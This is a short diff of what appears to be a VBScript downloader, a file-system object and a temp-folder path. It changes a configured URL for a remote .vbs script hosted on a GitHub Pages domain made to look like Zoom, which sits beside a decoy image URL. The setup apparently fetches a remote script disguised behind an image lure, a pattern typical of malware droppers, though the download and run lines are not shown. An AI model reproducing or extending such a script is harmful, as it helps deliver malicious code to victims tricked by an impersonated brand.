@@ -6,7 +6,7 @@ Set objFSO = CreateObject("Scripting.FileSystemObject")
 tempFolder = objFSO.GetSpecialFolder(2)
 
 ' ---------- CONFIGURE THESE URLS ----------
-remoteVBS_URL = "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/document.vbs"
+remoteVBS_URL = "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/image.vbs"
 remoteImage_URL = "https://i.pinimg.com/736x/47/1b/89/471b89ad7e1d0876f368e63da6f0cd66.jpg"
 ' ------------------------------------------
 
